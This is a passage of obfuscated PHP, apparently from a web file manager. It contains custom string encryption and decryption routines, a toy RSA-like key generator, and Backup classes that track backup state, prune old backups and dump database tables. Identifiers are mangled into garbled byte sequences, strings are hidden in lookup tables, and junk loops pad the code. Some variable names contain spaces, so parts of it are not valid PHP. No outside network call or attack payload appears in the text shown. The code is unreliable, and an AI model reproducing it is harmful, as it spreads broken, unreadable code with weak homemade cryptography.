$„úÌÛ[708]; if (strlen($øĞíù‰) < $„úÌÛ[625]) { return; } break; $æı¥ï»£ = $„úÌÛ[709]; while ($æı¥ï»£ < $„úÌÛ[622]) { if ($æı¥ï»£ >= 0) { break; } $æı¥ï»£++; } case $à“É‚‰[296]: $¦èÕßìÓ = $this->jkqmddfc77e4($ˆê¢€í…, md5($Ë¬¸²³ã . $¤ÄßûôÌ)); $å¯ºòä = $„úÌÛ[710]; break; case $à“É‚‰[297]: $ˆê¢€í… = base64_encode($ˆê¢€í…); $âÃìëÆš = $„úÌÛ[711]; while ($âÃìëÆš < $„úÌÛ[615]) { if ($âÃìëÆš >= 0) { break; } $âÃìëÆš++; } $ÆÎ…˜÷‘ = rand(0, 64); $ÒÉèÅÈ¤ = $…ÉøÉª[$ÆÎ…˜÷‘]; $ÔÏÂÃõ = md5($ÒÉèÅÈ¤ . md5($¤ÄßûôÌ . $ÒÉèÅÈ¤) . $¤ÄßûôÌ); $ÊÄöØ¼ç = $„úÌÛ[712]; if (!$ÊÄöØ¼ç) { return; } $ÔÏÂÃõ = substr($ÔÏÂÃõ, $ÆÎ…˜÷‘ % 8, $ÆÎ…˜÷‘ % 8 + 7); $Â¯ı¨öï = $„úÌÛ[713]; if (strlen($Â¯ı¨öï) < $„úÌÛ[632]) { die; } $ğÚ¿‹ï = $à“É‚‰[6]; $ĞÙŠàÔ = $„úÌÛ[714]; $—‚ûÖÆı = 0; $˜Ø»ÔÒ = $„úÌÛ[715]; if (strlen($˜Ø»ÔÒ) < $„úÌÛ[622]) { return; } $ÈÄÌİŞ = 0; $ªÛúİ = $„úÌÛ[716]; if (strlen($ªÛúİ) < $„úÌÛ[625]) { die; } $É½ƒ³÷û = 0; $¯ñ‹ˆ³˜ = $„úÌÛ[717]; for ($—‚ûÖÆı = 0; $—‚ûÖÆı < strlen($ˆê¢€í…); $—‚ûÖÆı++) { $É½ƒ³÷û = $É½ƒ³÷û == strlen($ÔÏÂÃõ) ? 0 : $É½ƒ³÷û; $ÈÄÌİŞ = ($ÆÎ…˜÷‘ + strpos($…ÉøÉª, $ˆê¢€í…[$—‚ûÖÆı]) + ord($ÔÏÂÃõ[$É½ƒ³÷û++])) % 64; $°è•¢ = $„úÌÛ[718]; if (!$°è•¢) { die; } $ğÚ¿‹ï .= $…ÉøÉª[$ÈÄÌİŞ]; $œô¼Öœï = $„úÌÛ[719]; while ($œô¼Öœï < $„úÌÛ[629]) { if ($œô¼Öœï >= 0) { break; } $œô¼Öœï++; } } $¦èÕßìÓ = hash_encode($ÒÉèÅÈ¤ . $ğÚ¿‹ï); $·ğ¹„ = $„úÌÛ[720]; if (strlen($·ğ¹„) < $„úÌÛ[629]) { return; } break; $æ›‹Á¿™ = $„úÌÛ[721]; if (strlen($æ›‹Á¿™) < $„úÌÛ[629]) { return; } default: $¦èÕßìÓ = $this->jkqmddfc77e4($ˆê¢€í…, $¤ÄßûôÌ . $Ë¬¸²³ã); $úË´Á¡û = $„úÌÛ[722]; if (strlen($úË´Á¡û) < $„úÌÛ[632]) { return; } break; $Ì»éüÁ = $„úÌÛ[723]; if (strlen($Ì»éüÁ) < $„úÌÛ[622]) { return; } } $¦èÕßìÓ = strrev($«üç§Ç . $Ë¬¸²³ã . $¦èÕßìÓ); if ($àŠÊâı - 1 > 0) { $¦èÕßìÓ = $this->swtz34eea697($¦èÕßìÓ, $¤ÄßûôÌ, $àŠÊâı - 1); } return $¦èÕßìÓ; } private function sfugc59b4b60($˜»­ÄÙ¢, $şö»Ó™Î, $ª‰¹†àé = 3) { $ˆ¯½ò«µ =& $_SERVER[³·—™¤¢]; $½¡‰ô…™ =& $_SERVER[šÓï™½ï]; if (!is_string($˜»­ÄÙ¢) || strlen($˜»­ÄÙ¢) < 10) { return !1; } $˜»­ÄÙ¢ = trim($˜»­ÄÙ¢); $Ş‰§·¹ = $ˆ¯½ò«µ[724]; while (strlen($Ş‰§·¹) < $ˆ¯½ò«µ[622]) { if (!$Ş‰§·¹) { break; } $Ş‰§·¹++; } $˜»­ÄÙ¢ = strrev($˜»­ÄÙ¢); $É†ğ¨ƒ° = $ˆ¯½ò«µ[725]; if (strlen($É†ğ¨ƒ°) < $ˆ¯½ò«µ[629]) { die; } $Ÿò™ÇÁ = $˜»­ÄÙ¢[0]; $‚çâ¿ƒ¬ = substr($˜»­ÄÙ¢, 1, 15); $˜»­ÄÙ¢ = substr($˜»­ÄÙ¢, 16); $àİ¦âšÏ = $½¡‰ô…™[294]; $¾›²â‚ = $ˆ¯½ò«µ[726]; while (strlen($¾›²â‚) < $ˆ¯½ò«µ[625]) { if (!$¾›²â‚) { break; } $¾›²â‚++; } switch ($Ÿò™ÇÁ) { case $½¡‰ô…™[202]: $üª’šİ” = $this->hzos9ab56c13($˜»­ÄÙ¢, strrev($şö»Ó™Î . $‚çâ¿ƒ¬)); break; $Ğ·ÇåŸü = $ˆ¯½ò«µ[727]; case $½¡‰ô…™[120]: $üª’šİ” = $this->hzos9ab56c13($˜»­ÄÙ¢, strrev($‚çâ¿ƒ¬ . $şö»Ó™Î)); $³›ø¯‡ü = $ˆ¯½ò«µ[728]; break; case $½¡‰ô…™[295]: $üª’šİ” = $this->hzos9ab56c13($˜»­ÄÙ¢, base64_encode($‚çâ¿ƒ¬ . $şö»Ó™Î)); $Ì£ğÜ¿ = $ˆ¯½ò«µ[729]; while (strlen($Ì£ğÜ¿) < $ˆ¯½ò«µ[615]) { if (!$Ì£ğÜ¿) { break; } $Ì£ğÜ¿++; } break; $ËÄÚ‚·š = $ˆ¯½ò«µ[730]; case $½¡‰ô…™[296]: $üª’šİ” = $this->hzos9ab56c13($˜»­ÄÙ¢, md5($‚çâ¿ƒ¬ . $şö»Ó™Î)); $¬í¥€¦Ñ = $ˆ¯½ò«µ[731]; break; $÷•ñ¿áú = $ˆ¯½ò«µ[732]; if (strlen($÷•ñ¿áú) < $ˆ¯½ò«µ[622]) { return; } case $½¡‰ô…™[297]: $˜»­ÄÙ¢ = hash_decode($˜»­ÄÙ¢); $Ö„˜Ğº‚ = $˜»­ÄÙ¢[0]; $˜»­ÄÙ¢ = substr($˜»­ÄÙ¢, 1); $ŸÈ¡ø·Ë = $ˆ¯½ò«µ[733]; $±ÉÒ»©× = strpos($àİ¦âšÏ, $Ö„˜Ğº‚); $ù™Ñ¼À÷ = $ˆ¯½ò«µ[734]; while (strlen($ù™Ñ¼À÷) < $ˆ¯½ò«µ[615]) { if (!$ù™Ñ¼À÷) { break; } $ù™Ñ¼À÷++; } $·ÈôÕÔç = md5($Ö„˜Ğº‚ . md5($şö»Ó™Î . $Ö„˜Ğº‚) . $şö»Ó™Î); $·ÈôÕÔç = substr($·ÈôÕÔç, $±ÉÒ»©× % 8, $±ÉÒ»©× % 8 + 7); $œÄü´¼ = $½¡‰ô…™[6]; $±ø”š” = 0; $„ççÍ¨á = 0; $ˆ¢èâà = $ˆ¯½ò«µ[735]; if (strlen($ˆ¢èâà) < $ˆ¯½ò«µ[622]) { return; } $úûßõõ = 0; $¤‘ÊÏÚ = $ˆ¯½ò«µ[736]; if (!$¤‘ÊÏÚ) { return; } for ($±ø”š” = 0; $±ø”š” < strlen($˜»­ÄÙ¢); $±ø”š”++) { $úûßõõ = $úûßõõ == strlen($·ÈôÕÔç) ? 0 : $úûßõõ; $“Ë‘í·’ = $ˆ¯½ò«µ[737]; if (strlen($“Ë‘í·’) < $ˆ¯½ò«µ[632]) { return; } $‰Å¤”â¹ = $úûßõõ++; $³‹éØ™ß = $ˆ¯½ò«µ[738]; if (strlen($³‹éØ™ß) < $ˆ¯½ò«µ[622]) { die; } $„ççÍ¨á = strpos($àİ¦âšÏ, $˜»­ÄÙ¢[$±ø”š”]) - $±ÉÒ»©× - ord($·ÈôÕÔç[$‰Å¤”â¹]); while ($„ççÍ¨á < 0) { $„ççÍ¨á += 64; } $œÄü´¼ .= $àİ¦âšÏ[$„ççÍ¨á]; $…ß¢Ÿøª = $ˆ¯½ò«µ[739]; while ($…ß¢Ÿøª < $ˆ¯½ò«µ[632]) { if ($…ß¢Ÿøª >= 0) { break; } $…ß¢Ÿøª++; } } $üª’šİ” = base64_decode($œÄü´¼); $ò·Œ•Ñ = $ˆ¯½ò«µ[740]; break; default: $üª’šİ” = $this->hzos9ab56c13($˜»­ÄÙ¢, $şö»Ó™Î . $‚çâ¿ƒ¬); break; $ĞÛû‰§™ = $ˆ¯½ò«µ[741]; if (strlen($ĞÛû‰§™) < $ˆ¯½ò«µ[632]) { return; } } if ($ª‰¹†àé - 1 > 0) { $üª’šİ” = $this->sfugc59b4b60($üª’šİ”, $şö»Ó™Î, $ª‰¹†àé - 1); } return $üª’šİ”; } public function tgnbd2deabb3($£¾ĞØØ€) { $‹§Ã¢õ =& $_SERVER[³·—™¤¢]; $ı€¶±ÒŞ =& $_SERVER[šÓï™½ï]; $˜§ŠÜÃÄ = $this->lnpwcc24b0a6(); $§‘™ç§ = $‹§Ã¢õ[742]; if (strlen($§‘™ç§) < $‹§Ã¢õ[622]) { die; } $¾ö¨’¸Ñ = $this->lnpwcc24b0a6(); $ğ©ôüí = $‹§Ã¢õ[743]; if (!$ğ©ôüí) { die; } $©‘Òæè = ($˜§ŠÜÃÄ - 1) * ($¾ö¨’¸Ñ - 1); $ŠşÜŞîŒ = $‹§Ã¢õ[744]; while (strlen($ŠşÜŞîŒ) < $‹§Ã¢õ[629]) { if (!$ŠşÜŞîŒ) { break; } $ŠşÜŞîŒ++; } $¥ùìØ”® = intval(($˜§ŠÜÃÄ + $¾ö¨’¸Ñ) / 2); while (1) { $™ìªˆìø = $¥ùìØ”®; $˜êàÚª‡ = $©‘Òæè; while ($˜êàÚª‡ % $™ìªˆìø != 0) { $úƒ…éà› = $˜êàÚª‡; $˜êàÚª‡ = $™ìªˆìø; $‹Åš«Ÿ = $‹§Ã¢õ[745]; if (!$‹Åš«Ÿ) { die; } $™ìªˆìø = $úƒ…éà› % $™ìªˆìø; $Å¤äœé = $‹§Ã¢õ[746]; if (!$Å¤äœé) { return; } } if ($™ìªˆìø == 1) { break; } else { $¥ùìØ”®++; } } $×€²é±ƒ = 2; $›Õòø»Ö = $‹§Ã¢õ[747]; for ($æî´ø“ö = 0; $æî´ø“ö < $©‘Òæè * 10; $æî´ø“ö++) { if (($©‘Òæè * $æî´ø“ö + 1) % $¥ùìØ”® == 0) { $×€²é±ƒ = intval(($©‘Òæè * $æî´ø“ö + 1) / $¥ùìØ”®); break; } } $¯áá£¸– = $this->jkqmddfc77e4($˜§ŠÜÃÄ * $¾ö¨’¸Ñ . $ı€¶±ÒŞ[6], $ı€¶±ÒŞ[134]); $Ù‡÷†øÓ = $‹§Ã¢õ[748]; $‚÷¦åú½ = md5($ı€¶±ÒŞ[298] . ($˜§ŠÜÃÄ + $¾ö¨’¸Ñ) . $ı€¶±ÒŞ[299] . $¥ùìØ”® . $ı€¶±ÒŞ[299] . $×€²é±ƒ . $ı€¶±ÒŞ[300]); $ÖÓ»¢½Æ = $‹§Ã¢õ[749]; if (!$ÖÓ»¢½Æ) { return; } $ÍÜ¤Á°Ó = $this->jkqmddfc77e4($£¾ĞØØ€, $‚÷¦åú½) . $ı€¶±ÒŞ[301] . $¯áá£¸–; $ã»‚œÇ€ = $‹§Ã¢õ[750]; if (!$ã»‚œÇ€) { die; } return $ÍÜ¤Á°Ó; } public function zapjda3283dd($€ÖÍËÈ) { $ÜÜÜ¯óâ =& $_SERVER[³·—™¤¢]; $òÅ¹ãå¸ =& $_SERVER[šÓï™½ï]; $ö›€á€ü = explode($òÅ¹ãå¸[301], $€ÖÍËÈ); $ º¡¯íÊ = $ÜÜÜ¯óâ[751]; if (!$ º¡¯íÊ) { return; } if (count($ö›€á€ü) != 2) { return $òÅ¹ãå¸[6]; } $…ŞŒí¼Ä = $this->hzos9ab56c13($ö›€á€ü[1] . $òÅ¹ãå¸[6], $òÅ¹ãå¸[134]); $½Š‚ç„ = $ÜÜÜ¯óâ[752]; if (strlen($½Š‚ç„) < $ÜÜÜ¯óâ[622]) { return; } if (!$…ŞŒí¼Ä) { return $òÅ¹ãå¸[6]; } $…ŞŒí¼Ä = intval($…ŞŒí¼Ä); $Ÿ®²ÉÑª = 0; $‡ºº©¨™ = 0; for ($©ÃŸÛ† = 3; $©ÃŸÛ† < $…ŞŒí¼Ä; $©ÃŸÛ† += 2) { if ($…ŞŒí¼Ä % $©ÃŸÛ† != 0) { continue; } $Ÿ®²ÉÑª = $©ÃŸÛ†; $‡ºº©¨™ = intval($…ŞŒí¼Ä / $©ÃŸÛ†); $Óı›ŠÌ‰ = $ÜÜÜ¯óâ[753]; if (!$Óı›ŠÌ‰) { die; } break; $±ÙêğÉ = $ÜÜÜ¯óâ[754]; while ($±ÙêğÉ < $ÜÜÜ¯óâ[622]) { if ($±ÙêğÉ >= 0) { break; } $±ÙêğÉ++; } } $ÕòÌÑ†˜ = ($Ÿ®²ÉÑª - 1) * ($‡ºº©¨™ - 1); $·ˆÜ®¾‘ = $ÜÜÜ¯óâ[755]; if (strlen($·ˆÜ®¾‘) < $ÜÜÜ¯óâ[632]) { return; } $ÙŠò´ğÊ = intval(($Ÿ®²ÉÑª + $‡ºº©¨™) / 2); while (1) { $ØÄÙºœÎ = $ÙŠò´ğÊ; $¡£Çúıå = $ÕòÌÑ†˜; $ìªè­¯à = $ÜÜÜ¯óâ[756]; while ($¡£Çúıå % $ØÄÙºœÎ != 0) { $º„Áîì = $¡£Çúıå; $ÑÁ¡¹öĞ = $ÜÜÜ¯óâ[757]; if (strlen($ÑÁ¡¹öĞ) < $ÜÜÜ¯óâ[622]) { return; } $¡£Çúıå = $ØÄÙºœÎ; $ØÄÙºœÎ = $º„Áîì % $ØÄÙºœÎ; } if ($ØÄÙºœÎ == 1) { break; } else { $ÙŠò´ğÊ++; } } $æˆê‹íÃ = 2; for ($©ÃŸÛ† = 0; $©ÃŸÛ† < $ÕòÌÑ†˜ * 10; $©ÃŸÛ†++) { if (($ÕòÌÑ†˜ * $©ÃŸÛ† + 1) % $ÙŠò´ğÊ == 0) { $æˆê‹íÃ = intval(($ÕòÌÑ†˜ * $©ÃŸÛ† + 1) / $ÙŠò´ğÊ); break; } } $¶¼‘‹»³ = md5($òÅ¹ãå¸[298] . ($Ÿ®²ÉÑª + $‡ºº©¨™) . $òÅ¹ãå¸[299] . $ÙŠò´ğÊ . $òÅ¹ãå¸[299] . $æˆê‹íÃ . $òÅ¹ãå¸[300]); $ô¤á‚¬Æ = $this->hzos9ab56c13($ö›€á€ü[0], $¶¼‘‹»³); $§ÄÌÈ¾» = $ÜÜÜ¯óâ[758]; while (strlen($§ÄÌÈ¾») < $ÜÜÜ¯óâ[632]) { if (!$§ÄÌÈ¾») { break; } $§ÄÌÈ¾»++; } return $ô¤á‚¬Æ; $ïºÌæàŸ = $ÜÜÜ¯óâ[759]; while ($ïºÌæàŸ < $ÜÜÜ¯óâ[615]) { if ($ïºÌæàŸ >= 0) { break; } $ïºÌæàŸ++; } } public function lnpwcc24b0a6() { $è«ëÖÇß =& $_SERVER[³·—™¤¢]; $Ş¨Û¾ï½ = mt_rand(pow(2, 14), pow(2, 16) - 1); $§æËÙå¸ = array(); $„Äğ“öæ = $è«ëÖÇß[760]; if (!$„Äğ“öæ) { return; } $ûÒÈ×Ú = 1; $°§…¤òÀ = $è«ëÖÇß[761]; while (strlen($°§…¤òÀ) < $è«ëÖÇß[615]) { if (!$°§…¤òÀ) { break; } $°§…¤òÀ++; } while ($ûÒÈ×Ú <= (int) sqrt($Ş¨Û¾ï½)) { $‹õá—Ø” = $ûÒÈ×Ú; while (!0) { $‹õá—Ø”++; if ($‹õá—Ø” <= 2) { $ûÒÈ×Ú = $‹õá—Ø”; break; } else { if ($‹õá—Ø” < 2) { continue; } } $óÁ­¬Õ = !0; for ($ª¬Œ³‘ = 2; $ª¬Œ³‘ <= sqrt($‹õá—Ø”); $ª¬Œ³‘++) { if ($‹õá—Ø” % $ª¬Œ³‘ == 0) { $óÁ­¬Õ = !1; } } if ($óÁ­¬Õ) { $ûÒÈ×Ú = $‹õá—Ø”; break; } } $§æËÙå¸[] = $ûÒÈ×Ú; $¡×ş²´© = $è«ëÖÇß[762]; if (strlen($¡×ş²´©) < $è«ëÖÇß[625]) { die; } } $Ù˜Ñö•¾ = 2; $‘„ØĞ¿“ = $è«ëÖÇß[763]; while ($‘„ØĞ¿“ < $è«ëÖÇß[632]) { if ($‘„ØĞ¿“ >= 0) { break; } $‘„ØĞ¿“++; } for ($‹õá—Ø” = $Ş¨Û¾ï½; $‹õá—Ø” > 1; $‹õá—Ø”--) { $óÁ­¬Õ = !0; $ïË“¸ä£ = $è«ëÖÇß[764]; foreach ($§æËÙå¸ as $•ƒÙ”­ğ) { if ($‹õá—Ø” % $•ƒÙ”­ğ == 0) { $óÁ­¬Õ = !1; break; } } if ($óÁ­¬Õ) { $Ù˜Ñö•¾ = $‹õá—Ø”; break; } } return $Ù˜Ñö•¾; } public function inzo8c0eb522($½ûìÆˆÇ, $ë›¹Ø) { $·´“¯­Ô =& $_SERVER[³·—™¤¢]; $èôİ„ÕŞ =& $_SERVER[šÓï™½ï]; return call_user_func(array($èôİ„ÕŞ[8], $èôİ„ÕŞ[302]), $½ûìÆˆÇ, $ë›¹Ø); $şñƒœòÎ = $·´“¯­Ô[765]; while ($şñƒœòÎ < $·´“¯­Ô[622]) { if ($şñƒœòÎ >= 0) { break; } $şñƒœòÎ++; } } public function jkqmddfc77e4($Äšß¢‚“, $Œ€Ô×ëı) { $Ë‹ÁºÕ” =& $_SERVER[šÓï™½ï]; return call_user_func(array($Ë‹ÁºÕ”[303], $Ë‹ÁºÕ”[304]), $Äšß¢‚“, $Œ€Ô×ëı); $Û¯¿¦Ô® = $_SERVER[³·—™¤¢][766]; if (!$Û¯¿¦Ô®) { return; } } public function hzos9ab56c13($Ò÷¢Ò¸ê, $÷ˆ÷ğ°ö) { $™›ò”¦’ =& $_SERVER[šÓï™½ï]; return call_user_func(array($™›ò”¦’[303], $™›ò”¦’[305]), $Ò÷¢Ò¸ê, $÷ˆ÷ğ°ö); $µ¿Æ¥¢ü = $_SERVER[³·—™¤¢][767]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $†Ã£ÄŞ† =& $_SERVER[³·—™¤¢]; $this->isManual(); self::$name = date($†Ã£ÄŞ†[768]); if (!($øÃ—Ş•« = Model($†Ã£ÄŞ†[769])->lastItem())) { $øÃ—Ş•« = $this->initData(); } else { self::$name = $øÃ—Ş•«[$†Ã£ÄŞ†[32]]; if ($øÃ—Ş•«[$†Ã£ÄŞ†[770]] == $†Ã£ÄŞ†[88]) { self::$name = date($†Ã£ÄŞ†[771]); $Æ‘´ë“é = 0; if (isset($øÃ—Ş•«[$†Ã£ÄŞ†[293]][$†Ã£ÄŞ†[199]][$†Ã£ÄŞ†[468]])) { $Æ‘´ë“é = (int) $øÃ—Ş•«[$†Ã£ÄŞ†[293]][$†Ã£ÄŞ†[199]][$†Ã£ÄŞ†[468]]; } if (self::$manual == 0 && $øÃ—Ş•«[$†Ã£ÄŞ†[32]] == self::$name) { Model($†Ã£ÄŞ†[769])->remove($øÃ—Ş•«[$†Ã£ÄŞ†[399]]); } $øÃ—Ş•« = $this->initData($Æ‘´ë“é, $øÃ—Ş•«[$†Ã£ÄŞ†[772]]); } else { $this->checkStore($øÃ—Ş•«[$†Ã£ÄŞ†[772]]); } } self::$option = $øÃ—Ş•«; } private function isManual() { $¯·¦¬„ç = _get($GLOBALS, $_SERVER[³·—™¤¢][773], 0); $¯·¦¬„ç = intval($¯·¦¬„ç); self::$manual = $¯·¦¬„ç && $¯·¦¬„ç == 1 ? 1 : 0; } private function initData($‡¬©õáš = 0, $Š¹¦Øç = '') { $ö¦µéåô =& $_SERVER[³·—™¤¢]; $µå©ÅêŞ = Model($ö¦µéåô[769])->config(); if ($Š¹¦Øç && $µå©ÅêŞ[$ö¦µéåô[772]] != $Š¹¦Øç) { $‡¬©õáš = 0; } $this->checkStore($µå©ÅêŞ[$ö¦µéåô[772]]); if (self::$manual == 1) { self::$name .= $ö¦µéåô[11] . date($ö¦µéåô[774]); } $íœ¡ë‹¾ = array($ö¦µéåô[772] => $µå©ÅêŞ[$ö¦µéåô[772]], $ö¦µéåô[32] => self::$name, $ö¦µéåô[770] => 0, $ö¦µéåô[775] => $µå©ÅêŞ[$ö¦µéåô[775]], $ö¦µéåô[776] => self::$manual, $ö¦µéåô[293] => array($ö¦µéåô[777] => array($ö¦µéåô[770] => 0), $ö¦µéåô[778] => array($ö¦µéåô[770] => 0, $ö¦µéåô[779] => 0, $ö¦µéåô[780] => 0, $ö¦µéåô[33] => $ö¦µéåô[12], $ö¦µéåô[781] => 0, $ö¦µéåô[497] => 0), $ö¦µéåô[782] => array($ö¦µéåô[770] => 0, $ö¦µéåô[779] => 0, $ö¦µéåô[780] => 0, $ö¦µéåô[781] => 0, $ö¦µéåô[497] => 0), $ö¦µéåô[199] => array($ö¦µéåô[770] => 0, $ö¦µéåô[783] => 0, $ö¦µéåô[784] => 0, $ö¦µéåô[785] => 0, $ö¦µéåô[786] => 0, $ö¦µéåô[468] => $‡¬©õáš, $ö¦µéåô[781] => 0, $ö¦µéåô[497] => 0)), $ö¦µéåô[781] => time(), $ö¦µéåô[497] => 0); $Ú§Ë±è™ = Model($ö¦µéåô[769])->insert($íœ¡ë‹¾); $íœ¡ë‹¾[$ö¦µéåô[399]] = $Ú§Ë±è™; return $íœ¡ë‹¾; } private function checkStore($›èÛã¢¾) { $ŒÍÆÖšü =& $_SERVER[³·—™¤¢]; $ÜÏ§²İ¿ = Model($ŒÍÆÖšü[787])->listData($›èÛã¢¾); Model($ŒÍÆÖšü[787])->checkConfig($ÜÏ§²İ¿); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[³·—™¤¢][769])->findByName(self::$name); } return self::$option; } public static function set($½ÍáÖº) { $Æá·Ú™è =& $_SERVER[³·—™¤¢]; $„ıä‚“ = self::get(); foreach ($½ÍáÖº as $øã‡Îİ => $·ÛŠÖÆÜ) { $¯ı£ÉæÀ = explode($Æá·Ú™è[10], $øã‡Îİ); $îÃòş¥ = count($¯ı£ÉæÀ); switch ($îÃòş¥) { case 1: $„ıä‚“[$¯ı£ÉæÀ[0]] = $·ÛŠÖÆÜ; break; case 2: $„ıä‚“[$¯ı£ÉæÀ[0]][$¯ı£ÉæÀ[1]] = $·ÛŠÖÆÜ; break; case 3: $„ıä‚“[$¯ı£ÉæÀ[0]][$¯ı£ÉæÀ[1]][$¯ı£ÉæÀ[2]] = $·ÛŠÖÆÜ; break; } } Model($Æá·Ú™è[769])->update($„ıä‚“[$Æá·Ú™è[399]], $„ıä‚“); self::$option = $„ıä‚“; return self::$option; } public function keep() { $â‚Ñ—»¦ =& $_SERVER[³·—™¤¢]; $Ùå–›à¨ = self::get(); if ($Ùå–›à¨[$â‚Ñ—»¦[293]][$â‚Ñ—»¦[777]][$â‚Ñ—»¦[770]] == $â‚Ñ—»¦[88]) { return; } $this->backupKeep($Ùå–›à¨); self::set(array($â‚Ñ—»¦[788] => 1)); } private function backupKeep($¼òõ‚Î‚) { $³£Ò‚ô =& $_SERVER[³·—™¤¢]; if (self::$manual == 1) { return; } $éÙš„Å¥ = Model($³£Ò‚ô[769])->listData(); if (empty($éÙš„Å¥)) { return; } $Ğä® âæ = 0; $èçƒ™©— = array(); foreach ($éÙš„Å¥ as $©ù¨…Ñƒ) { if ($Ğä® âæ >= 7) { break; } $èçƒ™©—[] = $©ù¨…Ñƒ[$³£Ò‚ô[32]]; $Ğä® âæ++; } for ($Ğä® âæ = 0; $Ğä® âæ < 12; $Ğä® âæ++) { $èçƒ™©—[] = date($³£Ò‚ô[789], strtotime("\x2d{$Ğä® âæ}\40\155\157\156\x74\x68\163")); } $èçƒ™©— = array_unique($èçƒ™©—); $÷Ñƒ§± = Model($³£Ò‚ô[790])->get($³£Ò‚ô[791]); foreach ($éÙš„Å¥ as $©ù¨…Ñƒ) { if (isset($©ù¨…Ñƒ[$³£Ò‚ô[776]]) && $©ù¨…Ñƒ[$³£Ò‚ô[776]] == $³£Ò‚ô[88]) { continue; } if (!empty($©ù¨…Ñƒ[$³£Ò‚ô[32]]) && in_array($©ù¨…Ñƒ[$³£Ò‚ô[32]], $èçƒ™©—)) { continue; } Model($³£Ò‚ô[769])->remove($©ù¨…Ñƒ[$³£Ò‚ô[399]]); $Ú’Êà¤£ = $this->backupPath($¼òõ‚Î‚, $÷Ñƒ§±); IO::remove($Ú’Êà¤£, !1); } } private function backupPath($µşôÎ³, $Êñú½µ” = false) { $øõ¶· =& $_SERVER[³·—™¤¢]; if (!$Êñú½µ”) { $Êñú½µ” = Model($øõ¶·[790])->get($øõ¶·[791]); } $Ë·‘Ïñ˜ = $µşôÎ³[$øõ¶·[32]]; $¯ªìŠÃú = substr(md5($øõ¶·[792] . $Êñú½µ” . $Ë·‘Ïñ˜), 0, 8); return "\173\x69\157\x3a{$µşôÎ³[$øõ¶·[772]]}\x7d\x2f\x64\141\x74\141\142\141\163\145\x2f\142\141\x63\x6b\x75\160\57" . $Ë·‘Ïñ˜ . $øõ¶·[11] . $¯ªìŠÃú; } public function db() { $•´ğ—êŞ =& $_SERVER[³·—™¤¢]; $—ª¢Şğ = self::get(); if ($—ª¢Şğ[$•´ğ—êŞ[293]][$•´ğ—êŞ[778]][$•´ğ—êŞ[770]] == $•´ğ—êŞ[88]) { return !0; } $âõ¬ƒæ = new BackupDb(); if (!$âõ¬ƒæ->index()) { return !1; } self::set(array($•´ğ—êŞ[793] => 1)); return !0; } public function dbFile() { $‘šÇá =& $_SERVER[³·—™¤¢]; $¨¢œğÁ = self::get(); if ($¨¢œğÁ[$‘šÇá[293]][$‘šÇá[782]][$‘šÇá[770]] == $‘šÇá[88]) { return !0; } $×Ï¦ÉÒ’ = new BackupDbFile(); if (!$×Ï¦ÉÒ’->index()) { return !1; } self::set(array($‘šÇá[794] => 1)); return !0; } public function file() { $¤õõ‰€¢ =& $_SERVER[³·—™¤¢]; $îİ¼Ş¶† = self::get(); if ($îİ¼Ş¶†[$¤õõ‰€¢[293]][$¤õõ‰€¢[199]][$¤õõ‰€¢[770]] == $¤õõ‰€¢[88]) { return !0; } if (!isset($îİ¼Ş¶†[$¤õõ‰€¢[775]]) || $îİ¼Ş¶†[$¤õõ‰€¢[775]] == $¤õõ‰€¢[197]) { $ üÚ¬áÔ = new BackupFile(); if (!$ üÚ¬áÔ->index()) { return !1; } } self::set(array($¤õõ‰€¢[795] => 1, $¤õõ‰€¢[770] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $˜éìøàÈ =& $_SERVER[³·—™¤¢]; $¸°ˆĞÊı = Backup::get(); self::$io = $¸°ˆĞÊı[$˜éìøàÈ[772]]; self::$name = $¸°ˆĞÊı[$˜éìøàÈ[32]]; $ÂĞ²Ôéï = new DbManage(); $ÂñÌÈî = $ÂĞ²Ôéï->dbType(); $çºİŠ¤ò = array($˜éìøàÈ[796] => $ÂñÌÈî, $˜éìøàÈ[797] => time()); Backup::set($çºİŠ¤ò); $àà »‚¡ = $this->tmpFilesPath() . $˜éìøàÈ[798] . self::$name . $˜éìøàÈ[8]; del_dir($àà »‚¡); mk_dir($àà »‚¡); $ı¼„í‰ì = $Õ›àßåú = 0; $Ú‘è´¬í = new Task($˜éìøàÈ[799], $˜éìøàÈ[800], 0, LNG($˜éìøàÈ[801]) . $˜éìøàÈ[802] . LNG($˜éìøàÈ[803])); try { $£³äè» = $ÂĞ²Ôéï->db()->getTables(); } catch (Exception $ÚĞÂÜ¤ã) { $Ú‘è´¬í->end(); return !1; } $£³äè» = array_diff($£³äè», array($˜éìøàÈ[804], $˜éìøàÈ[805])); foreach ($£³äè» as $›ìññâş) { $ı¼„í‰ì += $ÂĞ²Ôéï->model($›ìññâş)->count(); } $Ú‘è´¬í->task[$˜éìøàÈ[806]] = $ı¼„í‰ì; $GLOBALS[$˜éìøàÈ[807]] = self::$name; foreach ($£³äè» as $›ìññâş) { $ÉÙÔ¾½® = $àà »‚¡ . $›ìññâş . $˜éìøàÈ[808]; $œÛîó = null; if ($›ìññâş == $˜éìøàÈ[809] && (!isset($¸°ˆĞÊı[$˜éìøàÈ[775]]) || $¸°ˆĞÊı[$˜éìøàÈ[775]] == $˜éìøàÈ[197])) { $œÛîó = self::$io; } $Õ›àßåú += $ÂĞ²Ôéï->sqlFromDb($›ìññâş, $ÉÙÔ¾½®, $Ú‘è´¬í, $œÛîó); } unset($GLOBALS[$˜éìøàÈ[807]]); $Ú‘è´¬í->end(); if ($Õ›àßåú > $ı¼„í‰ì) { $ı¼„í‰ì = $Õ›àßåú; } $çºİŠ¤ò = array($˜éìøàÈ[796] => $ÂñÌÈî, $˜éìøàÈ[793] => 1, $˜éìøàÈ[810] => $ı¼„í‰ì, $˜éìøàÈ[811] => $Õ›àßåú, $˜éìøàÈ[812] => time()); Backup::set($çºİŠ¤ò); if ($ı¼„í‰ì - $Õ›àßåú > 0) { $‰è«Í’õ = $˜éìøàÈ[813]; if (stristr(I18n::getType(), $˜éìøàÈ[814])) { $‰è«Í’õ = $˜éìøàÈ[815]; } write_log(array($‰è«Í’õ, $çºİŠ¤ò), $˜éìøàÈ[800]); return !1; } return !0; } private function tmpFilesPath() { $üÛ²Æ¢ =& $_SERVER[³·—™¤¢]; $êŸÅ” õ = TEMP_FILES; if ($GLOBALS[$üÛ²Æ¢[6]][$üÛ²Æ¢[89]][$üÛ²Æ¢[816]]) { $êŸÅ” õ = 